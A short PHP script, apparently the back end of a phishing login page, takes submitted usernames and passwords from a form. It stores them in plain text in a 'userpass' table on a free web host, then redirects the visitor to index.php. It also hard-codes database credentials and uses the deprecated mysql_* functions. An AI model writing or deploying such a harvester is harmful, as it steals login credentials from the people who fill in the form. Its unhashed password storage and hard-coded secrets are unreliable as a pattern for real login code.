<?php 
header('Location: index.php ');          //SQLi secure
$link=mysql_connect("mysql1.000webhost.com","a4228986_1337","unlock123") or die("Sorry :( Connection Error");
mysql_select_db("a4228986_scrap");
$user=mysql_real_escape_string($_POST["user"]);
$pass=mysql_real_escape_string($_POST["pass"]);
$query="insert into userpass (user,pass) values ('$user','$pass')";
mysql_query($query,$link);
?>